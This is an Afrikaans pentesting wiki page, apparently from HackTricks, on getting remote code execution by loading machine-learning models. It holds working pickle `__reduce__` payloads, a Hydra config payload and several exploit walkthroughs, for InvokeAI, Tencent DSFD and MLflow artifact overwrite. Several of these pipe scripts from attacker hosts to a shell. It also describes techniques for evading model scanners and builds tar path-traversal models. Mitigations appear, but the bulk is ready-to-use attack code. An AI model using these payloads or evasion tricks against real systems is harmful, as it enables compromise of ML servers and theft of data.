# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laai om RCE te verkry

Masjienleermodelle word gewoonlik in verskillende formate gedeel, soos ONNX, TensorFlow, PyTorch, ens. Ontwikkelaars kan hierdie modelle op hul masjiene of produksiestelsels laai om dit te gebruik. Modelle behoort gewoonlik nie kwaadwillige kode te bevat nie, maar daar is gevalle waar ’n model gebruik kan word om arbitrêre kode op die stelsel uit te voer—hetsy as ’n bedoelde kenmerk of weens ’n kwesbaarheid in die model-laaibiblioteek.

Die volgende tabel lys verteenwoordigende kwesbaarhede in hierdie kategorie:

| **Raamwerk / Hulpmiddel**        | **Kwesbaarheid (CVE indien beskikbaar)**                                                    | **RCE-vektor**                                                                                                                           | **Verwysings**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Onveilige deserialisering in* `torch.load` **(CVE-2025-32434)**                                                              | Kwaadwillige pickle in model-kontrolepunt lei tot kode-uitvoering (omseil die `weights_only`-beskerming)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kwaadwillige modelaflaai veroorsaak kode-uitvoering; Java-deserialisering-RCE in bestuurs-API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Onveilige deserialisering van kontrolepunte via `torch.load` **(CVE-2025-23298)**                                           | ’n Onbetroubare kontrolepunt aktiveer pickle-reducer tydens `load_model_trainer_states_from_checkpoint` → kode-uitvoering in ML-werker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis-kontrolepuntbestuurders) | SQLi + onveilige MessagePack-uitbreidingshaak **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | ’n Gebruikerbeheerde `filter`-sleutel spuit SQL-/JSON-pad-sintaksis in, `UNION SELECT` fabriseer ’n vals kontrolepuntry, en daarna voer `msgpack`-deserialisering Python-kode in wat deur die aanvaller gekies is, en roep dit aan | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (onveilige YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Die laai van ’n model vanaf YAML gebruik `yaml.unsafe_load` (kode-uitvoering) <br> Die laai van ’n model met ’n **Lambda**-laag voer arbitrêre Python-kode uit          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-ontleding)                                                                                          | ’n Spesiaal vervaardigde `.tflite`-model veroorsaak heelgetaloorloop → heap-korrupsie (potensiële RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Die laai van ’n model via `joblib.load` voer pickle uit met die aanvaller se `__reduce__`-payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (onveilige `np.load`) *betwis*                                                                              | Die verstekinstelling van `numpy.load` het gepikte objekskikkings toegelaat – ’n kwaadwillige `.npy/.npz` veroorsaak kode-uitvoering                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (gidsoorgang) <br> **CVE-2024-5187** (tar-oorgang)                                                    | Die pad na ONNX-model se eksterne gewigte kan buite die gids uitkom (lees arbitrêre lêers) <br> ’n Kwaadwillige ONNX-model-tar kan arbitrêre lêers oorskryf (wat tot RCE lei) | |
| ONNX Runtime (ontwerprisiko)  | *(Geen CVE)* ONNX-pasgemaakte bewerkings / beheervloei                                                                                    | ’n Model met ’n pasgemaakte bewerking vereis dat die aanvaller se inheemse kode gelaai word; komplekse modelgrafieke misbruik logika om onbedoelde berekeninge uit te voer   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (pad-oorgang)                                                                                          | Die gebruik van die model-laai-API met `--model-control` geaktiveer laat relatiewe padaanstap toe om lêers te skryf (bv. `.bashrc` oorskryf om RCE te verkry)    | |
| **GGML (GGUF-formaat)**      | **CVE-2024-25664 … 25668** (verskeie heap-oorlope)                                                                         | ’n Misvormde GGUF-modelleêr veroorsaak heap-buffer-oorlope in die ontleder, wat arbitrêre kode-uitvoering op die slagoffer se stelsel moontlik maak                     | |
| **Keras (ouer formate)**   | *(Geen nuwe CVE)* Ouer Keras H5-model                                                                                         | Kode in ’n kwaadwillige HDF5 (`.h5`)-model met ’n Lambda-laag word steeds uitgevoer wanneer dit gelaai word (Keras `safe_mode` dek nie die ou formaat nie – “afgraderingsaanval”) | |
| **Ander** (algemeen)        | *Ontwerpfout* – Pickle-serialisering                                                                                         | Baie ML-hulpmiddels (bv. pickle-gebaseerde modelformate, Python `pickle.load`) sal arbitrêre kode uitvoer wat in modellêers ingebed is, tensy dit versag word | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Onbetroubare metadata wat aan `hydra.utils.instantiate()` deurgegee word **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Aanvallerbeheerde modelmetadata/-konfigurasie stel `_target_` op ’n arbitrêre oproepbare objek (bv. `builtins.exec`) → word tydens laai uitgevoer, selfs met “veilige” formate (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Verder is daar ’n paar Python-pickle-gebaseerde modelle, soos dié wat deur [PyTorch](https://github.com/pytorch/pytorch/security) gebruik word, wat arbitrêre kode op die stelsel kan uitvoer as dit nie met `weights_only=True` gelaai word nie. Enige pickle-gebaseerde model kan dus besonder vatbaar wees vir hierdie tipe aanvalle, selfs al word dit nie in die tabel hierbo gelys nie.

### Om statiese kontroles op pickle-gebaseerde kontrolepunte te ontduik

’n Model-laaipad wat onbeperkte `pickle.load()`, `joblib.load()` of `torch.load(..., weights_only=False)` aanroep, is ’n uitvoeringspunt, nie bloot ’n ontleder nie.<sup>[[22]](#references)</sup> In PyTorch 2.6 is `weights_only=True` die verstek vir `torch.load()` wanneer geen pasgemaakte pickle-module verskaf word nie; die voorbeelde hieronder vereis ’n onbeperkte laaier of ’n toepassing wat hierdie beskerming deaktiveer om ’n objek wat nie ondersteun word nie, te laai.<sup>[[4]](#references)</sup> ’n Skoon resultaat van ’n statiese skandering verander nie daardie grens nie.<sup>[[21]](#references)</sup>

Sien [Python pickle-deserialisering](../pentesting-web/deserialization/#pickle) vir die basiese `__reduce__`-primitief en [Fickling se ML-invoer-toelaatlys](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) vir looptyd-invoerkontroles.

#### Registreer ’n oproepbare objek en haal dit dan met `EXT2` op

’n Pickle kan `copyreg.add_extension` via `REDUCE` aanroep om ’n module-/naam-paar onder ’n aanvallergeselekteerde numeriese uitbreidingskode te registreer. ’n Latere `EXT2` haal die oproepbare objek vir daardie kode op, waarna ’n ander `REDUCE` dit kan aanroep. Die kritieke oproepbare objek is dus nie die operand van ’n `GLOBAL`- of `STACK_GLOBAL`-opcode nie. Binarly het dit gedemonstreer met `multiprocessing.util.spawnv_passfds`; vier van die vyf geëvalueerde skandeerders het dit gemis, terwyl SaferPickle dit opgespoor het. Die registerverandering en `EXT2`-ophaling vind binne dieselfde unpickling-bewerking plaas.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Dit is ’n opcode-skets, nie ’n volledige checkpoint nie: die buitenste loader moet die omringende pickle-stroom aanvaar. ’n Skandeerder wat net `GLOBAL`-operande vir gevaarlike callables deursoek, mis die latere lookup; ’n skandeerder sonder `EXT2`-ondersteuning kan faal voordat dit ’n uitspraak lewer. ’n Streng allowlist kan steeds `copyreg.add_extension` self verwerp.<sup>[[21]](#references)</sup>

#### Versteek gekonstrueerde code-object-tipes agter gewone funksies

Nog ’n pickle-ketting kan `FunctionType` verkry uit `type(copy.copy)` en `CodeType` uit `type(copy.copy.__code__)`, dan ’n code object uit verskafde bytecode konstrueer, dit as ’n funksie verpak en dit oproep. Die gepubliseerde variant verkry `__code__` deur `operator.methodcaller('__getattribute__', '__code__')`, dus hoef die pickle nie een van die konstruktors op naam in te voer nie. Die velduitleg en bytecode van `CodeType(...)` is CPython-weergawe-spesifiek; ’n payload wat vir ’n ander interpreter gebou is, kan voor uitvoering faal. SaferPickle het steeds die gedemonstreerde voorbeeld gemerk, maar dit na `suspicious` afgegradeer; die ander vier geëvalueerde skandeerders het dit gemis.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Sneller 'n tweede modellading vanaf 'n pickle-argument

'n Buitenste pickle kan `torch.storage._load_from_bytes` aanroep met 'n aanvaller-beheerde geserialiseerde model as argument. Daardie funksie roep `torch.load(io.BytesIO(b), weights_only=False)` aan, dus word die geneste model gedeserialiseer sonder die weights-only-beperking, al lyk dit vir 'n topvlak-opkode-skandeerder soos grepe wat aan een callable deurgegee word. Die buitenste laaiaksie moet steeds daardie callable toelaat; `weights_only=True` laat nie outomaties toe dat die buitenste pickle dit aanvaar nie. Skandeerders wat nie die geneste grepe rekursief ondersoek nie, kan die binneste `GLOBAL`/`REDUCE`-ketting miskyk.<sup>[[21]](#references)[[23]](#references)</sup>

#### Los 'n verouderde pickle-modulenaam tydens laai op

Vir pickle-protokolle laer as 3 koppel Python se verstekinstelling `fix_imports=True` 'n `GLOBAL`-verwysing na `commands.run` aan `subprocess.run` deur `_compat_pickle.IMPORT_MAPPING`. 'n Skandeerder wat die letterlike modulenaam met 'n `subprocess`-weierlys vergelyk, kan dus die callable miskyk wat tydens uitvoering gebruik word. Dit vereis 'n loader wat die versoenbaarheidskartering behou en die resulterende aanroepargumente aanvaar.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Lei 'n nie-ZIP-kontrolepunt verby 'n slegs-ZIP-skandeerder

Formaatkeuse kan onafhanklik van opkode-inspeksie misluk: Binarly het bevind dat ModelScan 0.8.8 `.bin`-, `.pt`-, `.pth`- en `.ckpt`-lêers na 'n ZIP-spesifieke PyTorch-skandeerder gestuur en 'n nie-ZIP-pickle-stroom oorgeslaan het, eerder as om na sy gewone pickle-skandeerder oor te skakel. Dit het ook 'n verouderde TAR-modelluitleg gedokumenteer wat `torch.load()` aanvaar, maar wat ModelScan en JFrog nie geïnspekteer het nie. Dit is leemtes wat van die skandeerderweergawe afhang, nie eienskappe van elke modelskandeerder nie.<sup>[[21]](#references)</sup>

#### Voer uit voordat 'n statiese ontleder 'n foutiewe stert bereik

'n Skandeerder wat 'n pickle volledig met `pickletools.genops()` deurloop, kan 'n fout veroorsaak wanneer dit ná 'n geldige `REDUCE` 'n afgekapte opkode teëkom. Die onbeperkte unpickler het die callable reeds aangeroep voordat dit daardie stert teëkom, selfs al misluk die algehele laaiaksie later. Die gerapporteerde voorbeeld het 'n afgekapte `BINUNICODE` onmiddellik ná die uitvoerende `REDUCE` geplaas, wat veroorsaak het dat `pickletools.genops()` misluk het nadat die vroeëre lêerskryf-newe-effek reeds plaasgevind het. Dit omseil 'n skandeerder slegs as dié die ontleedfout as skoon beskou of die lêer oorslaan. Dit is net nuttig wanneer die newe-effek saak maak sonder dat 'n model suksesvol teruggegee word; 'n teiken wat 'n voltooide laaiaksie vereis, kan die artefak verwerp.<sup>[[21]](#references)</sup>

### Hydra-metadata → RCE (werk selfs met safetensors)

`hydra.utils.instantiate()` voer enige gestippelde `_target_` in 'n konfigurasie-/metadata-objek in en roep dit aan. Wanneer biblioteke soos Hugging Face Transformers **onbetroubare modelmetadata** aan `instantiate()` deurgee, kan 'n aanvaller 'n callable en argumente verskaf wat onmiddellik tydens modellading loop (geen pickle nodig nie).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Voorbeeld van 'n payload (werk in `.nemo` `model_config.yaml`, repo se `config.json` of `__metadata__` binne `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Kernpunte:
- Word geaktiveer voor model-inisialisering in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace-coders en FlexTok-loaders.
- Hydra se string-bloklys kan omseil word via alternatiewe invoerpaadjies (bv. `enum.bltns.eval`) of name wat deur die toepassing opgelos word (bv. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok ontleed ook stringvormige metadata met `ast.literal_eval`, wat DoS (CPU-/geheueverbruik wat buite beheer raak) moontlik maak voordat die Hydra-aanroep plaasvind.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is ’n gewilde oopbron-webkoppelvlak vir Stable-Diffusion. Weergawes **5.3.1 – 5.4.2** stel die REST-eindpunt `/api/v2/models/install` bloot, wat gebruikers toelaat om modelle van arbitrêre URL’s af te laai en te laai.<sup>[[1]](#references)</sup>

Intern roep die eindpunt uiteindelik:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wanneer die verskafde lêer ’n **PyTorch-kontrolepunt (`*.ckpt`)** is, voer `torch.load` **pickle-deserialisering** uit. Omdat die inhoud direk van die gebruikerbeheerde URL af kom, kan ’n aanvaller ’n kwaadwillige voorwerp met ’n pasgemaakte `__reduce__`-metode in die kontrolepunt insluit; die metode word **tydens deserialisering** uitgevoer, wat lei tot **remote code execution (RCE)** op die InvokeAI-bediener.

Die kwesbaarheid is as **CVE-2024-12029** aangewys (CVSS 9.8, EPSS 61.17 %).

#### Uitbuitingsdeurloop

1. Skep ’n kwaadwillige kontrolepunt:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Huisves `payload.ckpt` op ’n HTTP-bediener wat jy beheer (bv. `http://ATTACKER/payload.ckpt`).
3. Aktiveer die kwesbare eindpunt (geen verifikasie word vereis nie):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Wanneer InvokeAI die lêer aflaai, roep dit `torch.load()` aan → die `os.system`-gadget loop en die aanvaller verkry kode-uitvoering in die konteks van die InvokeAI-proses.

Klaargemaakte exploit: Die **Metasploit**-module `exploit/linux/http/invokeai_rce_cve_2024_12029` outomatiseer die hele vloei.<sup>[[3]](#references)</sup>

#### Voorwaardes

•  InvokeAI 5.3.1-5.4.2 (scan-vlag se verstekwaarde is **false**)
•  `/api/v2/models/install` is bereikbaar vir die aanvaller
•  Die proses het toestemmings om shell-opdragte uit te voer

#### Versagtingsmaatreëls

* Gradeer op na **InvokeAI ≥ 5.4.3** – die patch stel `scan=True` as verstekwaarde en voer malware-skandering uit voor deserialisering.<sup>[[2]](#references)</sup>
* Gebruik `torch.load(file, weights_only=True)` of die nuwe [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-helper wanneer jy checkpoints programmaties laai.
* Dwing allow-lists / handtekeninge vir modelbronne af en laat die diens met die minste voorregte loop.

> ⚠️ Onthou dat **enige** Python-pickle-gebaseerde formaat (insluitend baie `.pt`-, `.pkl`-, `.ckpt`- en `.pth`-lêers) inherent onveilig is om van onbetroubare bronne te deserialiseer.

---

Voorbeeld van ’n ad-hoc-versagtingsmaatreël indien jy ouer InvokeAI-weergawes agter ’n reverse proxy moet laat loop:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE deur onveilige `torch.load` (CVE-2025-23298)

NVIDIA se Transformers4Rec (deel van Merlin) het ’n onveilige kontrolepuntlaaier blootgestel wat `torch.load()` direk op paaie wat deur gebruikers verskaf is, aangeroep het. Omdat `torch.load` op Python `pickle` staatmaak, kan ’n aanvallerbeheerde kontrolepunt arbitrêre kode uitvoer via ’n reducer tydens deserialisering.<sup>[[5]](#references)</sup>

Kwesbare pad (voor die regstelling): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Waarom dit tot RCE lei: In Python `pickle` kan ’n objek ’n reducer (`__reduce__`/`__setstate__`) definieer wat ’n oproepbare objek en argumente teruggee. Die oproepbare objek word tydens unpickling uitgevoer. As so ’n objek in ’n kontrolepunt voorkom, word dit uitgevoer voordat enige gewigte gebruik word.

Minimale voorbeeld van ’n kwaadwillige kontrolepunt:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Afleweringsvektore en ontploffingsradius:
- Getrojaniseerde checkpoints/models wat via repos, buckets of artifact registries gedeel word
- Outomatiese resume-/deploy-pipelines wat checkpoints outomaties laai
- Uitvoering vind binne training-/inference-werkers plaas, dikwels met verhoogde voorregte (bv. root in containers)

Oplossing: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) het die direkte `torch.load()` vervang met ’n beperkte deserializer met ’n toelaatlys, geïmplementeer in `transformers4rec/utils/serialization.py`. Die nuwe loader valideer tipes/velde en verhoed dat arbitrêre callables tydens laai opgeroep word.<sup>[[7]](#references)</sup>

Verdedigingsriglyne spesifiek vir PyTorch-checkpoints:
- Moenie onvertroude data unpickle nie. Verkies nie-uitvoerbare formate soos [Safetensors](https://huggingface.co/docs/safetensors/index) of ONNX waar moontlik.
- As jy PyTorch-serialisering moet gebruik, verseker dat `weights_only=True` gestel is (ondersteun in nuwer PyTorch-weergawes), of gebruik ’n pasgemaakte unpickler met ’n toelaatlys, soortgelyk aan die Transformers4Rec-patch.<sup>[[4]](#references)</sup>
- Dwing modelherkoms/-handtekeninge af en sandbox deserialisering (seccomp/AppArmor; nie-root-gebruiker; beperkte FS en geen uitgaande netwerkverkeer).
- Monitor onverwagte child processes van ML-dienste wanneer checkpoints gelaai word; spoor gebruik van `torch.load()`/`pickle` na.

POC- en kwesbare-/patchverwysings:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Kwesbare loader voor die patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC van kwaadwillige checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader ná die patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Voorbeeld – die skep van ’n kwaadwillige PyTorch-model

- Skep die model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Laai die model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent se FaceDetection-DSFD stel ’n `resnet`-endpoint bloot wat data deserialiseer wat deur die gebruiker beheer word. ZDI het bevestig dat ’n afgeleë aanvaller ’n slagoffer kan dwing om ’n kwaadwillige bladsy/lêer te laai, dit ’n vervaardigde serialized blob na daardie endpoint kan laat stuur en deserialisering as `root` kan laat plaasvind, wat tot volle kompromittering lei.

Die exploit-vloei weerspieël tipiese pickle-misbruik:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Enige gadget wat tydens deserialisering bereikbaar is (konstruktors, `__setstate__`, raamwerk-terugroepe, ens.) kan op dieselfde manier bewapen word, ongeag of die transport HTTP, WebSocket of ’n lêer was wat in ’n dopgehoude gids geplaas is.



### LangGraph checkpointer SQLi → MessagePack RCE

Hierdie aanvalsketting is interessant omdat die aanvaller **nie ’n kwaadwillige model-lêer hoef op te laai nie**. In plaas daarvan stel die toepassing ’n **AI-agent-persistensie-API** (`get_state_history(..., filter=...)`) bloot, en gebruikersinvoer bereik die checkpointer-navraagbouer.

#### 1. Strukturele SQLi in metadatafilters

’n Kwesbare SQLite-patroon het soos volg gelyk:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Die waarde word later gebind, maar `query_key` word in die **JSON-padstring** aaneengeskakel, so ’n `'` binne die dictionary key breek uit `'$.{query_key}'` en voer SQL in. Dieselfde les geld vir **JSON-paaie, identifiseerders, operateurs, `LIMIT`- en TTL-velde**: plekhouers beskerm slegs waardes, nie strukturele query-sintaksis nie.

#### 2. `UNION SELECT` kan afwaartse sinks teiken, nie net data steel nie

Die query gee `type` en geserialiseerde `checkpoint`-grepe terug, wat later verbruik word as:

```python
self.serde.loads_typed((type, checkpoint))
```

Dit beteken dat ’n SQLi in die `WHERE`-klousule ’n **vals resultaatry** kan inspuit:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

As kode later enige geselekteerde kolom ontleed, deserialiseer, skryf of uitvoer, koppel daardie kolomme aan hul sinks. In hierdie geval verander die vals ry SQLi in **deserialisering wat deur die aanvaller beheer word**.

#### 3. Onveilige MessagePack-uitbreidingshake is gelykstaande aan kodegadgets

LangGraph se `msgpack`-pad het ’n pasgemaakte uitbreidingshaak gebruik wat ’n geneste tupel uitgepak en die volgende uitgevoer het:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Dus voer ’n MessagePack-uitbreidingsobjek wat iets ekwivalent aan `("os", "system", "id > /tmp/pwned")` enkodeer, `os` in, vind `system` op en voer die opdrag uit. Wanneer jy AI-frameworks hersien, inspekteer **pasgemaakte MessagePack/JSON/pickle-revivors** vir dinamiese invoere, refleksie of arbitrêre aanroepbare-funksie-versending.

#### 4. Praktiese ouditpatroon vir agentframeworks

Hersien enige gebruikerbeheerde invoer wat by die volgende uitkom:
- staatgeskiedenis-/geheue-/terugspeel-/kontrolepuntlys-API’s
- gestruktureerde filterbouers wat SQL- of Redis-navraagfragmente genereer
- pasgemaakte deserialiseerders (`pickle`, `msgpack`, `json`-objekhake, YAML-konstruktors)
- herstelpaaie wat rye vertrou wat deur die volhardingslaag teruggestuur word

Hierdie spesifieke ketting het selfgehuisveste LangGraph-ontplooiings geraak wat **SQLite**- of **Redis**-kontrolepuntmakers gebruik het wanneer onbetroubare gebruikers `filter` kon beheer. Gelapte weergawes wat in die bekendmaking vermeld is, was `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` en `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow PyFunc-artefak-oorskrywing na pickle-RCE

’n MLflow PyFunc wat uit ’n `PythonModel` geskep is, kan die geserialiseerde objek as `python_model.pkl` stoor. Die modelmetadata benoem `mlflow.pyfunc.model` as sy laaier, en MLflow se implementering gebruik hierdie lêernaam vir die gestoorde Python-model. Gevolglik kan skryftoegang tot die artefakbewaarplek lei tot kode-uitvoering in ’n ander toepassing wat die model later laai.<sup>[[17]](#references)[[18]](#references)</sup>

Die nuttige ketting is **skryftoestemming vir artefakte → vervang die pickle → laat ’n afleidingsverbruiker dit herlaai**. Vir ’n eksperiment wat ’n geproksieerde `mlflow-artifacts:/...`-wortel gebruik, lys die eksperiment, uitvoering en model se artefakpad. Die naspoorbediener stel `GET` en `PUT` op `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` beskikbaar.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

’n Minimale reducer kan ’n opdrag uitvoer sodra die verbruiker die artefak unpickle. As die payload gegenereer word met die Python-weergawe wat in `MLmodel` verklaar is, word versoenbaarheidsprobleme vermy.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Aktiveer die bewerking wat die **bestaande model laai**, soos voorspelling, telling of ontplooiing. Moenie eers heroplei nie, want opleiding kan die kwaadwillige artefak met ’n vars model vervang. ’n Toepassingsfout weerlê nie uitbuiting nie: die reducer gee die opdrag se heelgetal-uitgangstatus terug in plaas van ’n bruikbare model. Begin met ’n waarneembare newe-effek, soos ICMP of ’n HTTP-terugskakeling, en vervang dit dan met die finale payload.<sup>[[20]](#references)</sup>

Onderskei tydens assessering tussen toestemming om ’n run te skep en toestemming om artefakte wat aan ’n ander run behoort, te oorskryf. Gaan verifikasie en opdateringstoestemmings per run na, ondersoek onverwagte wysigings aan `python_model.pkl`, en behandel modelherkoms en -integriteit as deel van die uitvoeringsgrens. Huidige MLflow-kode ondersteun ook die instelling `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` en beveel models-from-code-artefakte aan in plaas daarvan om cloudpickle-data te laai.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Blootgestelde modelbedieners en ML-infrastruktuur

Om ’n kwaadwillige model te laai, is nie die enigste manier om kode op ML-infrastruktuur uit te voer nie. Werkindienings-API’s, kodevalideringseindpunte en modelregister-optrekkings van selfgehuisveste AI-dienste kan tot kode-uitvoering lei sonder enige modellêer. Sien [Blootgestelde selfgehuisveste AI-dienste](AI-Exposed-Self-Hosted-AI-Services.md).

## Modelle na Path Traversal

Soos in [**hierdie blogplasing**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) genoem, is die meeste modelleformate wat deur verskillende AI-raamwerke gebruik word, op argiewe gebaseer, gewoonlik `.zip`. Daarom kan dit moontlik wees om hierdie formate te misbruik om Path Traversal-aanvalle uit te voer, wat toelaat dat willekeurige lêers gelees word vanaf die stelsel waarop die model gelaai word.<sup>[[16]](#references)</sup>

Met die volgende kode kan jy byvoorbeeld ’n model skep wat ’n lêer in die `/tmp`-gids skep wanneer dit gelaai word:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Of, met die volgende kode kan jy 'n model skep wat 'n symlink na die `/tmp`-gids sal skep wanneer dit gelaai word:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Diepgaande ondersoek: Keras .keras-deserialisering en gadget-soektog

Vir ’n gefokusde gids oor .keras-internals, Lambda-layer-RCE, die arbitrary import-kwessie in ≤ 3.8 en die ontdekking van gadgets binne die allowlist ná die regstelling, sien:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec-blog – "CVE-2024-12029 – Deserialisering van onbetroubare data in InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI-regstellingscommit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit-module-dokumentasie](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – sekuriteitsoorwegings vir torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI-blog – CVE-2025-23298: Verkryging van afstandkode-uitvoering in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI-advies: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec-regstellingscommit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Kwesbare loader voor die regstelling (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
